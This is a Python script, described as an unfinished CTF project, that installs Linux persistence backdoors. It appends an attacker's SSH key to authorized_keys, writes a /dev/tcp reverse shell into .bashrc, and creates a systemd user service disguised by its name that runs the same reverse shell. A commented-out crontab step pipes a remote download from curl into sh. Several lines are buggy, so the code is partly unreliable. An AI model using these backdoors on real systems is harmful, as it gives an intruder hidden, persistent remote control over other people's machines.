import os, sys, subprocess

'''
A little project (not finsished at the moment) using simple backdoor technique for CTF. 
https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
'''

class color:
    bold = '\033[1m'
    purple = bold + '\033[35m'
    blue = bold + '\033[36m'
    red = bold + '\033[91m'
    end = '\033[0m'


class Backdoor:
            
    def exploit(self, 
                ssh=False, 
                bashrc=False,
                crontab=False,
                service=False,):
        
            if ssh :
                path = ".ssh/authorized_keys"
                os.makedirs(os.path.dirname(path), exist_ok=True)
                ssh_key = input(f"{color.blue} [+] {color.end} Crafting SSH backdoor, please copy your key here : ")
                with open(path, 'a') as file:
                    file.write(ssh_key)
                    file.close()
                    print(color.blue, '[+]', color.end, 'Key successfully stored in ~/.ssh/authorized_keys')
            if bashrc:
                print(color.blue, '[+]', color.end, 'Crafting .bashrc backdoor')
                ip2back = int(input('Give me your IP address and your port <ip/port> : '))
                with open('~/.bashrc', 'a') as file:
                    file.write(f"bash -i >& /dev/tcp/{ip2back} 0>&1 &")
                    file.close()
                    print(color.blue, '[+]', color.end, 'Bashrc backdoor ready to fire')
            ## NOT WORKING
            # if crontab :
            #     print(color.blue, '[+]', color.end, 'Crafting crontab payload')
            #     if os.geteuid()!=0:
            #         print(color.red, 'This action must be performed as root', color.end)
            #         pass
            #     else:
            #         server_ip = input('Distant IP:PORT : (Usually ngrok or python webserver) ')
            #         try:
            #             subprocess.run("CT=$(crontab -l)", check=True)
            #             subprocess.run(f"CT=$CT$'\n10 * * * * curl http://{server_ip}/run | sh'", check=True)
            #             subprocess.run('printf', '"$CT"', '|',  'crontab', '-', check=True)
            #         except :
            #             print(color.red, '[-] An error occured during exploit process', color.end)
            #             pass
            if service:
                print(color.blue, '[+]', color.end, 'Crafting service backdoor')
                try:
                    with open('~/.config/systemd/user/system.service', 'w') as my_service:
                        ip_port = input("Your 'IP/PORT' here : ")
                        my_service.write(f'''
[Unit]
Description=You should not see this.

[Service]
Type=simple
ExecStart=/bin/bash -i >& /dev/tcp/{ip_port} 0>&1 &

[Install]
WantedBy=default.target
                                            ''')
                        try:
                            subprocess.run("systemctl",  "enable", "system.service", check=True)
                            print(color.blue, '[+]', color.end, 'Service enabled')
                        except:
                            print(color.red, '[-] Cannot enable the service ! ', color.end)
                except:
                    print(color.red, '[-] Cannot create the service', color.end)
           
            '''
            https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c
            '''

def header():
    print(f'''
{color.blue}😈 Stabilizing shells 😈{color.end} :
{color.purple}
+----------------------------------------------------+         
| 1 - python3 -c 'import pty;pty.spawn("/bin/bash")' |
| 2 - export TERM=xterm                              |
| 3 - Ctrl + Z                                       |
| 4 - stty raw -echo; fg                             |
+----------------------------------------------------+
{color.end}

More info about spawning TTY shells : https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
          ''')




if __name__ == '__main__':

    header()
    m = Backdoor()
    m.exploit(crontab=True)
    
    
    '''
    TO DO:
    Finish crontab
    Search for more way to backdoor things
   
    '''
    
